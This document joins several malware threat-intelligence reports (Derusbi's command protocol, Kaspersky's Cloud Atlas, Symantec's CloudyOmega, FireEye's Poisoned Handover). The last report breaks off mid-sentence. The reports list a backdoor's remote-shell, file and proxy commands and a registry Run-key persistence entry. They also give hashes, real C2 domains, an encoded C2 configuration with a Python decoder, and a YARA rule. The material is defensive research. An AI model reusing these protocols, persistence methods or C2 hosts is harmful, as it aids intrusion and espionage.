DWORD dwCommandType ; DWORD dwLastError ; } ;
The dwCommandType field specifies the specific PCC_CMD command that the client is requesting the server variant perform .
There are four commands that PCC_CMD supports :
dwCommandType Functionality 0x04 Activate the remote shell 0x08 Execute the specified file 0x0C Send input to remote shell 0x10 Terminate the remote shell .
For each of the commands , any output from or acknowledgement of the commands comes in the form of another packet consisting of a PacketHeader followed by a PCCCMDPacketHeader and any optional payload data .
The dwCommandType of the newly constructed packet matches the command ’ s original dwCommandType value ( e.g .
responses from 0x04 commands will reply with dwCommandType set to 0x04 ) .
PCC_CMD : :ProcessPacketEx will queue the response packets in an internal buffer .
The PCC_CMD : :ReadWaitingData member function is responsible for transmitting any of the previously queued packets from PCC_CMD : :ProcessPacketEx .
If there are no queued packets , PCC_CMD : :ReadWaitingData will perform a queue of the console output pipe for the remote shell process ( if it is active ) ; the function will also attempt to read the entirety of the waiting data , which then becomes the payload of a PacketHeader/PCCCMDPacketHeader based packet with the dwCommandType set to 0x0C .
If the read is unsuccessful , the function returns a PacketHeader/PCCCMDPacketHeader based packet with the dwCommandType set to 0x10 indicating an error and terminating the remote shell session .
PCC_FILE .
The PCC_FILE object provides a large range of file system administration functions .
PCC_FILE is derived from the PCC_BASEMOD class meaning that the processing of commands should be contained within the PCC_FILE : :ProcessPacket member function with some additional processing done in the PCC_FILE : :ReadWaitingData member function .
This is not necessarily the case , however .
The PCC_FILE : :ProcessPacket member function , much like PCC_CMD : :ProcessPacket , is little more than a stub function that passes only a copy of the payload data ( pkt ) to PCC_FILE : :ProcessPacketEx .
PCC_FILE : :ProcessPacketEx performs no file management operations but instead adds any incoming command packets to a queue for processing by PCC_FILE : :ReadWaitingData if the packet is not already within the queue ( thus avoiding duplication of commands ) .
The PCC_FILE : :ReadWaitingData member function is a stub function that calls PCC_FILE : :ProcessQueue and returns the resulting packet from the queue processing .
This means that file operations are surprisingly low priority , and potentially , high latency operations .
Each packet that arrives within the packet queue of PCC_FILE contains a standard header followed by a ( quasi-optional ) payload data blob .
The header for the PCC_FILE command packets takes the following form :
struct PCCFilePacketHeader { DWORD dwTotalPayloadSize ; DWORD dwCommandType ; } ;
The dwCommandType field specifies the specific PCC_FILE command that the client is requesting the server variant to perform .
PCC_FILE supports 17 ( of which 15 are unique ) commands .
While the general form within the Derusbi server variant communication model is to return a packet with the same dwCommandType as the original command , many of the PCC_FILE commands return a status packet type ( dwCommandType = 0x04 ) .
dwCommandType Functionality Response dwCommandType 0x0C Purge PCC_FILE Commands from Queue ( no response ) Based on dwCommandType 0x10 Enumerate Attached Drives 0x10 0x14 Get File Attributes 0x14 0x18 File Search 0x18 0x1C Rename File 0x04 0x20 Delete File 0x04 0x24 Create Directory 0x04 0x28 Upload File to Client 0x28 and 0x04 0x2C Recursively Enumerate Directory 0x2C 0x30 Download File from Client 0x04 0x34 Copy File 0x04 0x38 Move File 0x04 0x3C Duplicate File Timestamp 0x04 0x40 Execute File 0x04 0x44 Recursively Enumerate Directory 0x44 0x48 Recursively Enumerate Directory 0x48 0x4C Enumerate All Drives and Files 0x4C .
Commands 0x2C , 0x44 , and 0x48 all appear to be the exact same base command with only slight variations in their response format .
It is unclear why this particular command is included three times in PCC_FILE .
PCC_PROXY .
The PCC_PROXY object provides the platform for a tunneling network traffic to and from the client to a specific endpoint ( or endpoints if multiple tunnels are activated by the client ) .
Derived on the PCC_BASEMOD class , the PCC_PROXY class performs very little network tunneling within the CommLoop interactive PCC_PROXY : :ProcessPacket and PCC_PROXY : :ReadWaitingData member functions .
The PCC_PROXY : :ProcessPacket member function queues incoming PCC_PROXY packets into a received queue while PCC_PROXY : :ReadWaitingData returns packets from a transmit queue , with the directionality from the perspective of the server variant .
The core of the PCC_PROXY ’ s network tunneling comes from a spawned processing thread ( PCC_PROXY : :MainThread ) that is generated when the PCC_PROXY object is instantiated .
The PCC_PROXY : :MainThread function consist an infinite loop that only terminates when the PCC_PROXY : :fShutdown flag is set .
Otherwise , the loop will inspect another internal flag ( PCC_PROXY : :fNetworkEnabled ) to determine if the network tunneling is currently active .
If the PCC_PROXY : :fNetworkEnabled flag is set to false , then tunneling is disabled but command processing continues .
It is possible to have more than one tunnel active at any given time .
In order to firewall tunnels from each other over the backbone of the server variant ’ s command channel , each tunnel is assigned a specific channel identifier .
This allows the client to specify which specific tunnel data is transmitted to as well as telling the client which tunnel is returning data .
If the PCC_PROXY : :fNetworkEnabled flag is set to true , PRC_PROXY : :MainThread will loop through all active channels , perform a select on the socket connected to the endpoint and if the select indicates that there is data waiting on a particular socket the data is read .
A new PCC_PROXY based packet is then generated and the packet is queued for delivery to the client .
After processing each of the channels for new data , PCC_PROXY : :MainThread processes incoming command packets from the client ( an operation usually handled by the PCC_BASEMOD : :ProcessPacket function ) .
Packets belonging to the PCC_PROXY subsystem have a common header , much like the other PCC_BASEMOD derived classes .
To this end , the PCC_PROXY packets have the same packet header as the PCCFilePacketHeader packet header .
The PCC_PROXY supports five commands :
dwCommandType Functionality 0x04 Connect to Specified Endpoint ( Creates New Channel ) 0x08 Send Data to Endpoint 0x0C Terminate Channel 0x10 Enable Network Tunneling ( PCC_PROXY : :fNetworkEnabled set to true ) 0x14 Disable Network Tunneling ( PCC_PROXY : :fNetworkEnabled set to false ) .
Administrative Commands .
The administrative commands are built-in to the server variant and are not derived from the PCC_BASEMOD class .
Each of the administrative command packets contains the same header structure as the PCCFilePacketHeader structure followed by an optional payload data blob .
The administrative commands consist of the following five commands :
dwCommandType Functionality 0x08 Terminate the current network connection between the client and the server variant .
0x10 Run the Cleanup member function of each of the registered PCC_BASEMOD derived objects , effectively resetting the state of each of the modules .
0x14 Write infection ID to the registry and immediately terminate the server variant .
0x18 Shutdown the server variant ( set fShutdown to true ) 0x1C Drop a new DLL to % TEMP % \tmp1.dat , load the DLL into memory and call DllRegisterServer to install a new server variant binary on the victim ’ s system .
Detection .
Given the encrypted , and potentially compressed , nature of Derusbi server variant network traffic , detecting the traffic on a network can be problematic using traditional IDS signatures .
Using a heuristic approach , it would be possible to detect the handshake of a possible Derusbi server variant session by looking for the following pattern :
Client Server Exactly 64 bytes transmitted Exactly 64 bytes transmitted First 8 bytes taking the pattern of 0x28 0x00 0x00 0x00 0x02 0x00 0x00 0x00 .
Detecting Derusbi server variants on disk is possible using the following YARA signature :
rule Derusbi_Server { strings : $ uuid = `` { 93144EB0-8E3E-4591-B307-8EEBFE7DB28F } '' wide ascii $ infectionID1 = `` - % s- % 03d '' $ infectionID2 = `` - % 03d '' $ other = `` ZwLoadDriver '' condition : $ uuid or ( $ infectionID1 and $ infectionID2 and $ other ) } .
Cloud Atlas : RedOctober APT is back in style .
Two years ago , we published our research into RedOctober , a complex cyber-espionage operation targeting diplomatic embassies worldwide .
We named it RedOctober because we started this investigation in October 2012 , an unusually hot month .
After our announcement in January 2013 , the RedOctober operation was promptly shut down and the network of C & Cs was dismantled .
As usually happens with these big operations , considering the huge investment and number of resources behind it , they do n't just `` go away '' forever .
Normally , the group goes underground for a few months , redesigns the tools and the malware and resume operations .
See :
RedOctober Part 1 RedOctober Part 2 .
Since January 2013 , we 've been on the lookout for a possible RedOctober comeback .
One possible hit was triggered when we observed Mevade , an unusual piece of malware that appeared late in 2013 .
The Mevade C & C name styles as well as some other technical similarities indicated a connection to RedOctober , but the link was weak .
It was n't until August 2014 that we observed something which made us wonder if RedOctober is back for good .
Meet Cloud Atlas .
In August 2014 , some of our users observed targeted attacks with a variation of CVE-2012-0158 and an unusual set of malware .
We did a quick analysis of the malware and it immediately stood out because of certain unusual things that are not very common in the APT world .
Some of the filenames used in the attacks included :
FT Ukraine Russia 's new art of war.doc Катастрофа малайзийского лайнера.doc Diplomatic Car for Sale.doc МВКСИ.doc Organigrama Gobierno Rusia.doc Фото.doc Информационное письмо.doc Форма заявки ( 25-26.09.14 ) .doc Информационное письмо.doc Письмо_Руководителям.doc Прилож.doc Car for sale.doc Af-Pak and Central Asia 's security issues.doc .
At least one of them immediately reminded us of RedOctober , which used a very similarly named spearphish : `` Diplomatic Car for Sale.doc '' .
As we started digging into the operation , more details emerged which supported this theory .
Perhaps the most unusual fact was that the Microsoft Office exploit did n't directly write a Windows PE backdoor on disk .
Instead , it writes an encrypted Visual Basic Script and runs it .
Cloud Atlas exploit payload VBScript .
This VBScript drops a pair of files on disk a loader and an encrypted payload .
The loader appears to be different every time and internal strings indicate it is `` polymorphically '' generated .
The payload is always encrypted with a unique key , making it impossible to decrypt unless the DLL is available .
We observed several different spear-phishing documents that drop uniquely named payloads .
For instance , the `` qPd0aKJu.vbs '' file MD5 : E211C2BAD9A83A6A4247EC3959E2A730 drops the following files :
DECF56296C50BD3AE10A49747573A346 bicorporate encrypted payload D171DB37EF28F42740644F4028BCF727 ctfmonrn.dll loader .
The VBS also adds a registry key : HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run \ setting the key `` bookstore '' to the value `` regsvr32 % path % \ctfmonrn.dll /s '' , which ensures the malware runs every time at system boot .
Some of the DLL names we observed include :
f4e15c1c2c95c651423dbb4cbe6c8fd5 bicorporate.dll 649ff144aea6796679f8f9a1e9f51479 fundamentive.dll 40e70f7f5d9cb1a669f8d8f306113485 papersaving.dll 58db8f33a9cdd321d9525d1e68c06456 previliges.dll f5476728deb53fe2fa98e6a33577a9da steinheimman.dll .
Some of the payload names include :
steinheimman papersaving previliges fundamentive bicorporate miditiming damnatorily munnopsis arzner redtailed roodgoose acholias salefians wartworts frequencyuse nonmagyar shebir getgoing .
The payload includes an encrypted configuration block which contains information about the C & C sever :
The information from the config includes a WebDAV URL which is used for connections , a username and password , two folders on the WebDAV server used to store plugins/modules for the malware and where data from the victim should be uploaded .
C & C communication .
The Cloud Atlas implants utilize a rather unusual C & C mechanism .
All the malware samples we 've seen communicate via HTTPS and WebDav with the same server `` cloudme.com '' , a cloud services provider .
According to their website , CloudMe is owned and operated by CloudMe AB , a company based in Linköping , Sweden .
( Important note : we do not believe that CloudMe is in any way related to the Cloud Atlas group the attackers simply create free accounts on this provider and abuse them for command-and-control ) .
Each malware set we have observed so far communicates with a different CloudMe account though .
The attackers upload data to the account , which is downloaded by the implant , decrypted and interpreted .
In turn , the malware uploads the replies back to the server via the same mechanism .
Of course , it should be possible to reconfigure the malware to use any Cloud-based storage service that supports WebDAV .
Here 's a look at one such account from CloudMe :
The data from the account :
The files stored in the randomly named folder were uploaded by the malware and contain various things , such as system information , running processes and current username .
The data is compressed with LZMA and encrypted with AES , however , the keys are stored in the malware body which makes it possible to decrypt the information from the C & C .
We previously observed only one other group using a similar method – ItaDuke – that connected to accounts on the cloud provider mydrive.ch .
Victim statistics : top 5 infected countries .
Similarities with RedOctober .
Just like with RedOctober , the top target of Cloud Atlas is Russia , followed closely by Kazakhstan , according to data from the Kaspersky Security Network ( KSN ) .
Actually , we see an obvious overlap of targets between the two , with subtle differences which closely account for the geopolitical changes in the region that happened during the last two years .
Interestingly , some of the spear-phishing documents between Cloud Atlas and RedOctober seem to exploit the same theme and were used to target the same entity at different times .
Both Cloud Atlas and RedOctober malware implants rely on a similar construct , with a loader and the final payload that is stored encrypted and compressed in an external file .
There are some important differences though , especially in the encryption algorithms used – RC4 in RedOctober vs AES in Cloud Atlas .
The usage of the compression algorithms in Cloud Altas and RedOctober is another interesting similarity .
Both malicious programs share the code for LZMA compression algorithm .
In CloudAtlas it is used to compress the logs and to decompress the decrypted payload from the C & C servers , while in Red October the `` scheduler '' plugin uses it to decompress executable payloads from the C & C .
It turns out that the implementation of the algorithm is identical in both malicious modules , however the way it is invoked is a bit different , with additional input sanity checks added to the CloudAtlas version .
Another interesting similarity between the malware families is the configuration of the build system used to compile the binaries .
Every binary created using the Microsoft Visual Studio toolchain has a special header that contains information about the number of input object files and version information of the compilers used to create them , the `` Rich '' header called so by the magic string that is used to identify it in the file .
We have been able to identify several RedOctober binaries that have `` Rich '' headers describing exactly the same layout of VC 2010 + VC 2008 object files .
Although this does n't necessarily mean that the binaries were created on the same development computer , they were definitely compiled using the same version of the Microsoft Visual Studio up to the build number version and using similar project configuration .
Number of object Number of object Number of object files , Red October HEX compiler Decoded compiler files , CloudAtlas files , Red October Fileputexec version version loader Office plugin plugin VC 2010 ( build 01 01 01 009D766F 30319 ) VC 2010 ( build 01 01 01 009B766F 30319 ) VC 2010 ( build 22 2E 60 00AB766F 30319 ) 5B 60 A3 00010000 – VC 2008 ( build 05 07 11 00937809 30729 ) VC 2010 ( build 72 5C AD 00AA766F 30319 ) VC 2010 ( build 20 10 18 009E766F 30319 ) .
To summarize the similarities between the two :
Cloud Atlas RedOctober Shellcode marker in spearphished PT @ T PT @ T documents Top target country Russia Russia Compression algorithm used for LZMA LZMA C & C communications C & C servers claim to be / redirect to BBC ( mobile malware ) BBC VC 2010 ( build 30319 ) ( some Compiler version VC 2010 ( build 30319 ) modules ) .
Finally , perhaps the strongest connection comes from targeting .
Based on observations from KSN , some of the victims of RedOctober are also being targeted by CloudAtlas .
In at least one case , the victim 's computer was attacked only twice in the last two years , with only two malicious programs – RedOctober and Cloud Atlas .
These and other details make us believe that CloudAtlas represents a rebirth of the RedOctober attacks .
Conclusion .
Following big announcements and public exposures of targeted attack operations , APT groups behave in a predictable manner .
Most Chinese-speaking attackers simply relocate C & C servers to a different place , recompile the malware and carry on as if nothing happened .
Other groups that are more nervous about exposure go in a hibernation mode for months or years .
Some may never return using the same tools and techniques .
However , when a major cyber-espionage operation is exposed , the attackers are unlikely to completely shut down everything .
They simply go offline for some time , completely reshuffle their tools and return with rejuvenated forces .
We believe this is also the case of RedOctober , which makes a classy return with Cloud Atlas .
Kaspersky products detect the malware from the Cloud Atlas toolset with the following verdicts :
Exploit.Win32 . CVE-2012-0158 .j Exploit.Win32 . CVE-2012-0158 .eu Exploit.Win32 . CVE-2012-0158 .aw Exploit.MSWord . CVE-2012-0158 .ea HEUR : Trojan.Win32.CloudAtlas.gen HEUR : Trojan.Win32.Generic HEUR : Trojan.Script.Generic Trojan-Spy.Win32.Agent.ctda Trojan-Spy.Win32.Agent.cteq Trojan-Spy.Win32.Agent.ctgm Trojan-Spy.Win32.Agent.ctfh Trojan-Spy.Win32.Agent.cter Trojan-Spy.Win32.Agent.ctfk Trojan-Spy.Win32.Agent.ctfj Trojan-Spy.Win32.Agent.crtk Trojan-Spy.Win32.Agent.ctcz Trojan-Spy.Win32.Agent.cqyc Trojan-Spy.Win32.Agent.ctfg Trojan-Spy.Win32.Agent.ctfi Trojan-Spy.Win32.Agent.cquy Trojan-Spy.Win32.Agent.ctew Trojan-Spy.Win32.Agent.ctdg Trojan-Spy.Win32.Agent.ctlf Trojan-Spy.Win32.Agent.ctpz Trojan-Spy.Win32.Agent.ctdq Trojan-Spy.Win32.Agent.ctgm Trojan-Spy.Win32.Agent.ctin Trojan-Spy.Win32.Agent.ctlg Trojan-Spy.Win32.Agent.ctpd Trojan-Spy.Win32.Agent.ctps Trojan-Spy.Win32.Agent.ctpq Trojan-Spy.Win32.Agent.ctpy Trojan-Spy.Win32.Agent.ctie Trojan-Spy.Win32.Agent.ctcz Trojan-Spy.Win32.Agent.ctgz Trojan-Spy.Win32.Agent.ctpr Trojan-Spy.Win32.Agent.ctdp Trojan-Spy.Win32.Agent.ctdr Trojan.Win32.Agent.idso Trojan.Win32.Agent.idrx HEUR : Trojan.Linux.Cloudatlas.a Trojan.AndroidOS.Cloudatlas.a Trojan.IphoneOS.Cloudatlas.a .
Parallel research :
Blue Coat Exposes Inception Framework .
Operation CloudyOmega : Ichitaro zero-day and ongoing cyberespionage campaign targeting Japan .
JustSystems has issued an update to its Ichitaro product line ( Japanese office suite software ) , plugging a zero-day vulnerability .
This vulnerability is being actively exploited in the wild to specifically target Japanese organizations .
The exploit is sent to the targeted organizations through emails with a malicious Ichitaro document file attached , which Symantec products detect as Bloodhound.Exploit.557 .
Payloads from the exploit may include Backdoor.Emdivi , Backdoor.Korplug , and Backdoor.ZXshell ; however , all payloads aim to steal confidential information from the compromised computer .
The content of the emails vary depending on the business interest of the targeted recipient ’ s organization ; however , all are about recent political events associated with Japan .
Opening the malicious attachment with Ichitaro will drop the payload and display the document .
Often such exploitation attempts crash and then relaunch the document viewer to open a clean document in order to trick users into believing it is legitimate .
In this particular attack , opening the document and dropping the payload are done without crashing Ichitaro and , as such , users have no visual indications as to what is really happening in the background .
CloudyOmega .
As Security Response previously discussed , unpatched vulnerabilities being exploited is nothing new for Ichitaro .
However , during our investigation of this Ichitaro zero-day attack , we discovered that the attack was in fact part of an ongoing cyberespionage campaign specifically targeting various Japanese organizations .
Symantec has named this attack campaign CloudyOmega .
In this campaign , variants of Backdoor.Emdivi are persistently used as a payload .
All attacks arrive on the target computers as an attachment to email messages .
Mostly the attachments are in a simple executable format with a fake icon .
However , some of the files exploit software vulnerabilities , and the aforementioned vulnerability in Ichitaro software is only one of them .
This group ’ s primary goal is to steal confidential information from targeted organizations .
This blog provides insights into the history of the attack campaign , infection methods , malware payload , and the group carrying out the attacks .
Timeline .
The first attack of the campaign can be traced back to at least 2011 .
Figure 1 shows the targeted sectors and the number of attacks carried out each year .
The perpetrators were very cautious launching attacks in the early years with attacks beginning in earnest in 2014 .
By far , the public sector in Japan is the most targeted sector hit by Operation CloudyOmega .
This provides some clue as to who the attack group is .
Figure 1 .
Targeted sectors and number of attacks .
Attack vector .
Email is the predominant infection vector used in this campaign .
Figure 2 .
Sample email used in attack campaign .
Figure 2 is an example of an email used in recent attacks prior to those exploiting the Ichitaro zero-day vulnerability .
The emails include password-protected .zip files containing the malware .
Ironically , the attackers follow security best practices by indicating in the first email that the password will be sent to the recipient in a separate email .
This is merely to trick the recipient into believing the email is from a legitimate and trustworthy source .
The body of the email is very short and claims the attachment includes a medical receipt .
The email also requests that the recipient open the attachment on a Windows computer .
The file in the attachment has a Microsoft Word icon but , as indicated within Windows Explorer , it is an executable file .
Figure 3 .
Attached “ document ” is actually a malicious executable file .
Payload .
The malicious payload is Backdoor.Emdivi , a threat that opens a back door on the compromised computer .
The malware is exclusively used in the CloudyOmega attack campaign and first appeared in 2011 when it was used in an attack against a Japanese chemical company .
Emdivi allows the remote attacker executing the commands to send the results back to the command-and-control ( C & C ) server through HTTP .
Each Emdivi variant has a unique version number and belongs to one of two types : Type S and Type T .
The unique version number is not only a clear sign that Emdivi is systematically managed , but it also acts as an encryption key .
The malware adds extra words to the version number and then , based on this , generates a hash , which it uses as an encryption key .
Both Emdivi Type S and Type T share the following functionality :
Allow a remote attacker to execute code through HTTP Steal credentials stored by Internet Explorer .
Type T is primarily used in Operation CloudyOmega , has been in constant development since the campaign was first launched in 2011 , and is written in the C++ programing language .
Type T employs techniques to protect itself from security vendors or network administrators .
Important parts of Type T , such as the C & C server address it contacts and its protection mechanisms , are encrypted .
Type T also detects the presence of automatic analysis systems or debuggers , such as the following :
VirtualMachine Debugger Sandbox .
Type S , on the other hand , was used only twice in the attack campaign .
Type S is a .NET application based on the same source code and shared C & C infrastructure as Type T .
However , protection mechanisms and encryption , essential features for threat survival , are not present in Type S .
One interesting trait of Type S is that it uses Japanese sentences that seem to be randomly taken from the internet to change the file hash .
For instance , in the example shown in Figure 4 , it uses a sentence talking about the special theory of relativity .
Figure 4 .
Japanese text used by Emdivi Type S variant .
Who is Emdivi talking to ?
Once infected , Emdivi connects to hardcoded C & C servers using the HTTP protocol .
So far , a total of 50 unique domains have been identified from 58 Emdivi variants .
Almost all websites used as C & C servers are compromised Japanese websites ranging from sites belonging to small businesses to personal blogs .
We discovered that 40 out of the 50 compromised websites , spread across 13 IP addresses , are hosted on a single cloud-hosting service based in Japan .
Figure 5 .
Single IP hosts multiple compromised websites .
The compromised sites are hosted on various pieces of web server software , such as Apache and Microsoft Internet Information Services ( IIS ) , and are on different website platforms .
This indicates that the sites were not compromised through a vulnerability in a single software product or website platform .
Instead , the attacker somehow penetrated the cloud service itself and turned the websites into C & C servers for Backdoor.Emdivi .
The compromised cloud hosting company has been notified but , at the time of writing , has not replied .
Symantec offers two IPS signatures that detect and block network communication between infected computers and the Emdivi C & C server :
System Infected : Backdoor.Emdivi Activity System Infected : Backdoor.Emdivi Activity 2 .
Zero-day and links to other cybercriminal groups .
During our research , multiple samples related to this attack campaign were identified and allowed us to connect the dots , as it were , when it came to CloudyOmega 's connections to other attack groups .
In August 2012 , the CloudyOmega attackers exploited the zero-day Adobe Flash Player and AIR 'copyRawDataTo ( ) ' Integer Overflow Vulnerability ( CVE-2012-5054 ) in an attack against a high-profile organization in Japan .
The attackers sent a Microsoft Word file containing a maliciously crafted SWF file that exploited the vulnerability .
Once successfully exploited , the file installed Backdoor.Emdivi .
As CVE 2012-5054 was publicly disclosed in the same month , the attack utilized what was , at the time , a zero-day exploit .
Interestingly , the Flash file that was used in an Emdivi attack in 2012 and the one used in the LadyBoyle attack in 2013 look very similar .
Figure 6 shows the malformed SWF file executing LadyBoyle ( ) code that attempts to exploit the Adobe Flash Player CVE-2013-0634 Remote Memory Corruption Vulnerability ( CVE-2013-0634 ) .
The Flash file seems to have been created using the same framework used by the CloudyOmega group , but with a different exploit .
Figure 6 .
Malformed SWF file used in the LadyBoyle campaign in February 2013 .
Both attacks use a .doc file containing an Adobe Flash zero-day exploit that is used to install a back door .
No other evidence connects these two different campaigns ; however , as described previously in Symantec Security Response ’ s Elderwood blog , it is strongly believed that a single parent organization has broken into a number of subgroups that each target a particular industry .
In terms of the latest attack on Ichitaro , we collected a dozen samples of JTD files , all of which are exactly the same except for their payload .
The parent organization , it would seem , supplied the zero-day exploit to the different subgroups as part of an attack toolkit and each group launched a separate attack using their chosen malware .
This is why three different payloads ( Backdoor.Emdivi , Backdoor.Korplug , and Backdoor.ZXshell ) were observed in the latest zero-day attack .
Figure 7 .
Parent group sharing zero-day exploit .
Conclusion .
Operation CloudyOmega was launched by an attack group that has communication channels with other notorious attack groups including Hidden Lynx and the group responsible for LadyBoyle .
CloudyOmega has been in operation since 2011 and is persistent in targeting Japanese organizations .
With the latest attack employing a zero-day vulnerability , there is no indication that the group will stop their activities anytime soon .
Symantec Security Response will be keeping a close eye on the CloudyOmega group .
Protection summary .
It is highly recommended that customers using Ichitaro products apply any patches as soon as possible .
Symantec offers the following protection against attacks associated with Operation CloudyOmega :
AV .
Backdoor.Emdivi Backdoor.Emdivi ! gen1 Backdoor.Emdivi ! gen2 Bloodhound.Exploit.557 Trojan.Mdropper .
IPS .
System Infected : Backdoor.Emdivi Activity System Infected : Backdoor.Emdivi Activity 2 .
Operation Poisoned Handover : Unveiling Ties Between APT Activity in Hong Kong ’ s Pro-Democracy Movement .
As the pro-democracy movement in Hong Kong has continued , we ’ ve been watching for indications of confrontation taking place in cyberspace .
Protests began in September and have continued to escalate .
In recent weeks , attackers have launched a series of Distributed Denial of Service attacks ( DDoS ) against websites promoting democracy in Hong Kong .
According to the Wall Street Journal , websites belonging to Next Media ’ s Apple Daily publication have suffered from an ongoing DDoS attack that “ brought down its email system for hours ” .
According to other reports , Next Media ’ s network has suffered a “ total failure ” as a result of these attacks .
Additionally , at least one member of the popular online forum HKGolden was arrested for posting messages encouraging support for the OccupyCentral Pro Democracy movement .
The use of DDoS attacks as a political tool during times of conflict is not new ; patriotic hacktivist groups frequently use them as a means to stifle political activity of which they disapprove .
The question of state sponsorship ( or at least tacit approval ) in online crackdowns is often up for debate and ambiguous from a technical evidence and tradecraft perspective .
In this case , however , we ’ ve discovered an overlap in the tools and infrastructure used by China-based advanced persistent threat ( APT ) actors and the DDoS attack activity .
We believe that these DDoS attacks are linked to previously observed APT activity , including Operation Poisoned Hurricane .
This correlation sheds light on the potential relationships , symbiosis and tool sharing between patriotic hacker activities designed to disrupt anti-government activists in China , and the APT activity we consistently see that is more IP theft and espionage-focused .
Ongoing DDoS Attacks Target the Pro-Democracy Movement .
FireEye has identified a number of binaries coded to receive instructions from a set of command and control ( C2 ) servers instructing participating bots to attack Next Media-owned websites and the HKGolden forum .
Next Media is a large media company in Hong Kong and the HkGolden forum has been used as a platform to organize pro-democracy protests .
Each sample we identified is signed with digital certificates that have also been used by APT actors to sign binaries in previous intrusion operations :
These binaries are W32 Cabinet self-extracting files that drop a variant of an older DDoS tool known as KernelBot .
All of the samples we identified have the “ NewVersion ” value of 20140926 .
Structurally , all of these samples are similar in that they drop three files :
• ctfmon.exe-a legitimate , signed copy of the Pidgin IM client ( md5 hash = 1685f978149d7ba8e039af9a4d5803c7 ) • libssp-0.dll–malware DLL which is side-loaded by ctfmon.exe to decode and launch KernelBot .
Most versions of this dll are also signed by either the QTI or CallTogether certificate .
• readme.txt – a binary file which contains the XOR-encoded KernelBot DLL as well as C2 destination information ( most have md5 hash of b5ac964a74091d54e091e68cecd5b532 ) .
The KernelBot implants receive targeting instructions from C2 servers hard-coded directly into the sample .
For example , c3d6450075d618b1edba17ee723eb3ca drops a KernelBot variant that connects to both www.sapporo-digital-photoclub.com and wakayamasatei.com .
The full list of C2 servers we identified is as follows :
sapporo-digital-photoclub.com wakayamasatei.com tommo.jp mizma.co.jp sp.you-maga.com nitori-tour.com ninekobe.com shinzenho.jp wizapply.com www.credo-biz.com .
On Oct .
21 , the control server at wakayamasatei.com responded with the following encoded configuration file :
@ $ @ cWFPWERPRnlPXl5DRE13JyBjWXhPWkVYXnleS15PFxonIGNZbkVdRGxDRk 94X0QaFxonIGlHTmNuGhcbJyBuRV1EbENGT3hfRH9YRhoXQl5eWhAFBRsaBBo EGwQbHxsFGwRPUk8nIHF/Wk5LXk95T1hcT1h3JyBkT118T1hZQ0VEFxgaGx4 aExgcJyB/Wk5LXk9sQ0ZPf1hGF0JeXloQBQUbGgQaBBsEGx8bBRsET1JPJyBx bm5leXViRVleeV5LXkNZXkNJWXcnIGlFX0Ref1hGFycgfkNHT1gXGCcgcW5uZ Xl1eUlYQ1pebEZFRU53JyBjWXlJWENaXmxGRUVOFxsnIGlHTmNuFxsYGScgeU lYQ1pebEZFRU5uZHkXJyB5SVhDWl5sRkVFTn9YRhdCXl5aEAUFRFJLWkMES1p aRk9OS0NGUwRJRUcEQkEFJyB5SVhDWl5sRkVFTnpFWF4XEhonIGNZbU9ef1hG bENGTxcbJyBjWXlPRE56S0lBT14XGicgfkJYT0tOZkVFWn5DR08XHycgfkJYT 0tOaUVfRF4XGxonIH5DR09YFxkcGicgY1l+Q0dPWBcbJyBxbm5leXV5SVhDWl 5sRkVFTnVrG3cnIGNZeUlYQ1pebEZFRU4XGicgaUdOY24XGycgeUlYQ1pebEZ FRU5uZHkXGxoEGgQbBBsfGycgeUlYQ1pebEZFRU5/WEYXGxoEGgQbBBsfGwUb BEJeR0YnIHlJWENaXmxGRUVOekVYXhcSGicgY1ltT15/WEZsQ0ZPFxsnIGNZe U9ETnpLSUFPXhcbJyB+QlhPS05mRUVafkNHTxcbJyB+QlhPS05pRV9EXhcbJy B+Q0dPWBcYGicgY1l+Q0dPWBcbJyBxbm5leXV/TlpsRkVFTncnIGNZf05abEZ FRU4XGicgaUdOY24XGycgf05abEZFRU5uZHkXGxoEGgQbBBsfGycgfkJYT0tO aUVfRF4XGycgfkNHT1gXGBonIGNZfkNHT1gXGycgcW5uZXl1f05abEZFRU51a xt3JyBjWX9OWmxGRUVOFxonIGlHTmNuFxsnIH9OWmxGRUVObmR5FxsaBBoEGw QbHxsnIH5CWE9LTmlFX0ReFxsnIH5DR09YFxgaJyBjWX5DR09YFxsnIHFubmV 5dXlTRGxGRUVOdycgY1l5U0RsRkVFThcaJyBpR05jbhcbJyB5U0RsRkVFTm5k eRcbGgQaBBsEGx8bJyB5U0RsRkVFTnpFWF4XEhonIH5CWE9LTmlFX0ReFxsnI H5DR09YFxgaJyBjWX5DR09YFxsnIHFubmV5dX5JWmxGRUVOdycgY1l+SVpsRk VFThcaJyBpR05jbhcbJyB+SVpsRkVFTm5keRcbGgQaBBsEGx8bJyB+SVpsRkV FTnpFWF4XEhonIGNZeU9ETnpLSUFPXhcbJyB+QlhPS05pRV9EXhcbJyB+Q0dP WBcYGicgY1l+Q0dPWBcbJyBxbm5leXV+SVpsRkVFTnVrG3cnIGNZfklabEZFR U4XGicgaUdOY24XGycgfklabEZFRU5uZHkXGxoEGgQbBBsfGycgfklabEZFRU 56RVheFxIaJyBjWXlPRE56S0lBT14XGycgfkJYT0tOaUVfRF4XHCcgfkNHT1g XGBonIGNZfkNHT1gXGycg @ $ @ .
This configuration file can be decoded by stripping the leading and trailing @ $ @ characters .
At this point , a simple base64 and XOR decode will reveal the plaintext configuration .
The following snippet of python code can be used to decode this command :
b64encoded = request.content.rstrip ( ' @ $ @ ' ) .lstrip ( ' @ $ @ ' ) b64decoded = b64encoded.decode ( `` base64 '' ) command = `` `` for c in b64decoded : x = ord ( c ) x = x ^ XOR_key command += chr ( x ) .
FireEye has observed two different single-byte XOR keys used to encode configuration files issued by the DDOS C2 servers in this campaign .
The two different keys are 0x2A or 0x7E .
The encoded configuration file shown above decodes to :
